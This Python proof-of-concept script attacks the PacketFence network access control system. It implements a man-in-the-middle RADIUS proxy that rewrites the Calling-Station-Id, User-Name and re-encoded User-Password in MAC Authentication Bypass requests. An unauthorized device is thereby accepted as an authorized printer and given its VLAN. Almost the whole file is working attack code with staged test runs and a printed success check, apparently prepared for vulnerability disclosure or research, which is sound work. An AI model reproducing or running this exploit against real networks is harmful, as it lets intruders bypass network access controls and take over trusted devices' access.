#!/usr/bin/env python3
"""
PacketFence MAB Device Spoofing — End-to-End PoC
==================================================
Target: PacketFence NAC (open source, inverse-inc/packetfence)

Vulnerability:
  PacketFence uses Calling-Station-Id from RADIUS Access-Request to identify
  devices in MAB (MAC Authentication Bypass) authentication. Since Access-Request
  has no attribute integrity protection (RFC 2865), an on-path MITM can replace
  Calling-Station-Id with an authorized device's MAC address, gaining that
  device's network access (VLAN, role, ACL).

Source code evidence:
  lib/pf/Switch.pm parseRequest() line ~3276:
    my $client_mac = clean_mac($radius_request->{'Calling-Station-Id'});
  — No validation that Calling-Station-Id matches the actual connecting device.

  lib/pf/radius.pm authorize() line ~140:
    my (..., $mac, ...) = $switch->parseRequest($radius_request);
  — $mac is then used for node lookup, VLAN assignment, locationlog.

Attack chain:
  1. Unauthorized device connects to switch port (MAB enabled)
  2. Switch sends Access-Request with Calling-Station-Id = real MAC (unknown)
  3. MITM intercepts, replaces Calling-Station-Id with authorized printer MAC
  4. Also replaces User-Name and re-encodes User-Password to match
  5. RADIUS server authenticates as the printer → Access-Accept with VLAN 10
  6. Response Authenticator is valid (computed by server with correct shared secret)
  7. NAS applies corporate VLAN to unauthorized device

Full E2E chain: NAS → MITM Proxy → RADIUS Server → MITM Proxy → NAS
"""
import sys
import os
import struct
import hashlib
import socket
import time

sys.path.insert(0, os.path.dirname(__file__))
from radius_utils import *
from mitm_proxy import MITMProxy

MITM_PORT = 1814
AUTHORIZED_MAC = "aabbccddeeff"      # Authorized printer
UNAUTHORIZED_MAC = "deadbeef1234"     # Unauthorized device


def verify_response_authenticator(resp_data, request_auth, secret):
    if len(resp_data) < 20:
        return False
    code = resp_data[0]
    ident = resp_data[1]
    length = struct.unpack("!H", resp_data[2:4])[0]
    recv_auth = resp_data[4:20]
    attrs = resp_data[20:length]
    expected = hashlib.md5(
        struct.pack("!BBH", code, ident, length) + request_auth + attrs + secret
    ).digest()
    return recv_auth == expected


def send_and_parse(attrs, auth, server, port, ident):
    packet = build_radius_packet(CODE_ACCESS_REQUEST, ident, auth, attrs)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5.0)
    try:
        sock.sendto(packet, (server, port))
        data, _ = sock.recvfrom(4096)
        return data, parse_radius_response(data)
    except Exception as e:
        return None, {"code": -1, "code_name": f"Error({e})", "attributes": []}
    finally:
        sock.close()


def extract_policy(resp):
    policy = {}
    for attr in resp.get("attributes", []):
        t = attr["type"]
        v = attr.get("value", attr.get("raw_value"))
        if t == ATTR_REPLY_MESSAGE:
            policy["reply_message"] = v
        elif t == 11:  # Filter-Id
            policy["filter_id"] = v
        elif t == ATTR_TUNNEL_PRIVATE_GROUP_ID:
            policy["vlan"] = v
    return policy


class MABMITMProxy(MITMProxy):
    """Extended MITM proxy for MAB spoofing.
    
    In MAB, User-Name = User-Password = MAC address.
    When we change Calling-Station-Id, we must also change User-Name
    and re-encode User-Password to match the spoofed MAC.
    """

    def __init__(self, spoof_mac, **kwargs):
        super().__init__(**kwargs)
        self.spoof_mac = spoof_mac

    def _apply_rules(self, packet):
        if len(packet) < 20:
            return packet, []

        code = packet[0]
        identifier = packet[1]
        length = struct.unpack("!H", packet[2:4])[0]
        authenticator = packet[4:20]

        attr_list = self._parse_attributes(packet, 20, length)
        actions = []

        new_attr_list = []
        for atype, raw in attr_list:
            if atype == ATTR_CALLING_STATION_ID:
                # Replace Calling-Station-Id with authorized MAC
                new_val = self.spoof_mac.encode()
                new_raw = struct.pack("!BB", ATTR_CALLING_STATION_ID, 2 + len(new_val)) + new_val
                new_attr_list.append((ATTR_CALLING_STATION_ID, new_raw))
                actions.append(f"REPLACE Calling-Station-Id → {self.spoof_mac}")
            elif atype == ATTR_USER_NAME:
                # In MAB, User-Name = MAC address, must match
                new_val = self.spoof_mac.encode()
                new_raw = struct.pack("!BB", ATTR_USER_NAME, 2 + len(new_val)) + new_val
                new_attr_list.append((ATTR_USER_NAME, new_raw))
                actions.append(f"REPLACE User-Name → {self.spoof_mac}")
            elif atype == ATTR_USER_PASSWORD:
                # In MAB, User-Password = MAC address (encrypted)
                # Re-encode with the spoofed MAC
                new_pwd = encode_password(self.spoof_mac.encode(), SHARED_SECRET, authenticator)
                new_raw = struct.pack("!BB", ATTR_USER_PASSWORD, 2 + len(new_pwd)) + new_pwd
                new_attr_list.append((ATTR_USER_PASSWORD, new_raw))
                actions.append(f"RE-ENCODE User-Password for {self.spoof_mac}")
            else:
                new_attr_list.append((atype, raw))

        modified = self._rebuild_packet(code, identifier, authenticator, new_attr_list)
        return modified, actions


def main():
    print()
    print("#" * 70)
    print("#  PacketFence MAB Device Spoofing — E2E PoC")
    print("#  Chain: NAS → MITM Proxy → RADIUS Server → MITM Proxy → NAS")
    print("#" * 70)

    # ================================================================
    # STEP 1: Baseline — Unauthorized device, direct to server
    # ================================================================
    print("\n" + "=" * 70)
    print("  STEP 1: Baseline — Unauthorized device MAB (no MITM)")
    print("=" * 70)

    auth1 = compute_request_authenticator()
    attrs1 = b""
    attrs1 += build_string_attr(ATTR_USER_NAME, UNAUTHORIZED_MAC)
    attrs1 += build_attribute(ATTR_USER_PASSWORD,
                              encode_password(UNAUTHORIZED_MAC.encode(), SHARED_SECRET, auth1))
    attrs1 += build_ipaddr_attr(ATTR_NAS_IP_ADDRESS, "10.0.0.1")
    attrs1 += build_string_attr(ATTR_CALLING_STATION_ID, UNAUTHORIZED_MAC)
    attrs1 += build_integer_attr(ATTR_NAS_PORT_TYPE, 15)  # Ethernet
    attrs1 += build_integer_attr(ATTR_NAS_PORT, 1)
    attrs1 += build_integer_attr(ATTR_SERVICE_TYPE, 10)  # Call-Check (MAB)

    raw1, resp1 = send_and_parse(attrs1, auth1, "172.20.0.10", RADIUS_AUTH_PORT, 0xB1)
    policy1 = extract_policy(resp1)

    print(f"  Device MAC: {UNAUTHORIZED_MAC}")
    print(f"  Calling-Station-Id: {UNAUTHORIZED_MAC}")
    print(f"  User-Name: {UNAUTHORIZED_MAC}")
    print(f"  Server response: {resp1.get('code_name')}")
    print(f"  VLAN: {policy1.get('vlan', 'N/A')}")
    print(f"  Reply-Message: {policy1.get('reply_message', 'N/A')}")

    baseline_rejected = resp1.get("code") == CODE_ACCESS_REJECT

    # ================================================================
    # STEP 2: Verify authorized device works
    # ================================================================
    print("\n" + "=" * 70)
    print("  STEP 2: Verify — Authorized printer MAB (no MITM)")
    print("=" * 70)

    auth2 = compute_request_authenticator()
    attrs2 = b""
    attrs2 += build_string_attr(ATTR_USER_NAME, AUTHORIZED_MAC)
    attrs2 += build_attribute(ATTR_USER_PASSWORD,
                              encode_password(AUTHORIZED_MAC.encode(), SHARED_SECRET, auth2))
    attrs2 += build_ipaddr_attr(ATTR_NAS_IP_ADDRESS, "10.0.0.1")
    attrs2 += build_string_attr(ATTR_CALLING_STATION_ID, AUTHORIZED_MAC)
    attrs2 += build_integer_attr(ATTR_NAS_PORT_TYPE, 15)
    attrs2 += build_integer_attr(ATTR_NAS_PORT, 1)
    attrs2 += build_integer_attr(ATTR_SERVICE_TYPE, 10)

    raw2, resp2 = send_and_parse(attrs2, auth2, "172.20.0.10", RADIUS_AUTH_PORT, 0xB2)
    auth_ok2 = verify_response_authenticator(raw2, auth2, SHARED_SECRET) if raw2 else False
    policy2 = extract_policy(resp2)

    print(f"  Device MAC: {AUTHORIZED_MAC}")
    print(f"  Calling-Station-Id: {AUTHORIZED_MAC}")
    print(f"  Server response: {resp2.get('code_name')}")
    print(f"  Response Authenticator valid: {'✓' if auth_ok2 else '✗'}")
    print(f"  VLAN: {policy2.get('vlan', 'N/A')}")
    print(f"  Filter-Id: {policy2.get('filter_id', 'N/A')}")
    print(f"  Reply-Message: {policy2.get('reply_message', 'N/A')}")

    # ================================================================
    # STEP 3: Attack — MITM spoofs unauthorized device as authorized
    # ================================================================
    print("\n" + "=" * 70)
    print("  STEP 3: Attack — MITM spoofs Calling-Station-Id")
    print("=" * 70)

    proxy = MABMITMProxy(spoof_mac=AUTHORIZED_MAC, listen_port=MITM_PORT)
    proxy.start_background()
    time.sleep(0.5)

    # NAS sends the REAL unauthorized device's MAB request through MITM
    auth3 = compute_request_authenticator()
    attrs3 = b""
    attrs3 += build_string_attr(ATTR_USER_NAME, UNAUTHORIZED_MAC)
    attrs3 += build_attribute(ATTR_USER_PASSWORD,
                              encode_password(UNAUTHORIZED_MAC.encode(), SHARED_SECRET, auth3))
    attrs3 += build_ipaddr_attr(ATTR_NAS_IP_ADDRESS, "10.0.0.1")
    attrs3 += build_string_attr(ATTR_CALLING_STATION_ID, UNAUTHORIZED_MAC)
    attrs3 += build_integer_attr(ATTR_NAS_PORT_TYPE, 15)
    attrs3 += build_integer_attr(ATTR_NAS_PORT, 1)
    attrs3 += build_integer_attr(ATTR_SERVICE_TYPE, 10)

    raw3, resp3 = send_and_parse(attrs3, auth3, "127.0.0.1", MITM_PORT, 0xB3)
    auth_ok3 = verify_response_authenticator(raw3, auth3, SHARED_SECRET) if raw3 else False
    policy3 = extract_policy(resp3)

    print(f"  Real device MAC: {UNAUTHORIZED_MAC}")
    print(f"  NAS sends Calling-Station-Id: {UNAUTHORIZED_MAC}")
    print(f"  MITM changes to: {AUTHORIZED_MAC}")
    if proxy.log:
        print(f"  MITM actions: {proxy.log[-1].get('actions', [])}")
    print(f"  Server response: {resp3.get('code_name')}")
    print(f"  Response Authenticator valid: {'✓' if auth_ok3 else '✗'}")
    print(f"  VLAN: {policy3.get('vlan', 'N/A')}")
    print(f"  Filter-Id: {policy3.get('filter_id', 'N/A')}")
    print(f"  Reply-Message: {policy3.get('reply_message', 'N/A')}")

    # ================================================================
    # STEP 4: Analysis
    # ================================================================
    print("\n" + "=" * 70)
    print("  STEP 4: Attack Analysis")
    print("=" * 70)

    print(f"\n  Step 1 — Unauthorized device (no MITM):")
    print(f"    Result: {resp1.get('code_name')}")
    print(f"    VLAN: {policy1.get('vlan', 'N/A')} (rejected as expected)")

    print(f"\n  Step 2 — Authorized printer (no MITM):")
    print(f"    Result: {resp2.get('code_name')}")
    print(f"    VLAN: {policy2.get('vlan', 'N/A')}")

    print(f"\n  Step 3 — Unauthorized device via MITM (spoofed as printer):")
    print(f"    Result: {resp3.get('code_name')}")
    print(f"    VLAN: {policy3.get('vlan', 'N/A')}")
    print(f"    Auth valid: {'✓' if auth_ok3 else '✗'}")

    attack_success = (
        baseline_rejected and
        resp3.get("code") == CODE_ACCESS_ACCEPT and
        policy3.get("vlan") == "10"
    )

    print(f"\n  {'=' * 50}")
    if attack_success:
        print(f"  ✓ ATTACK SUCCESSFUL — MAB DEVICE SPOOFING CONFIRMED")
        print(f"  {'=' * 50}")
        print(f"  Unauthorized device ({UNAUTHORIZED_MAC}) was rejected in Step 1.")
        print(f"  After MITM spoofing Calling-Station-Id to {AUTHORIZED_MAC},")
        print(f"  the same device received Access-Accept with VLAN {policy3.get('vlan')}.")
        print(f"  NAS verified Response Authenticator ✓ — attack is undetectable.")
        print(f"")
        print(f"  Impact: Unauthorized device gains authorized device's network access")
        print(f"  Root cause: PacketFence trusts Calling-Station-Id from Access-Request")
        print(f"  Source: lib/pf/Switch.pm parseRequest() line ~3276")
        print(f"  Affected: PacketFence (all versions using MAB)")
    else:
        print(f"  ✗ ATTACK FAILED")
        print(f"  {'=' * 50}")
        print(f"  baseline_rejected={baseline_rejected}")
        print(f"  attack_code={resp3.get('code_name')}")
        print(f"  attack_vlan={policy3.get('vlan', 'N/A')}")

    proxy.stop()

    print(f"\n{'#' * 70}")
    print(f"#  PoC Complete")
    print(f"{'#' * 70}\n")

    return 0 if attack_success else 1


if __name__ == "__main__":
    sys.exit(main())
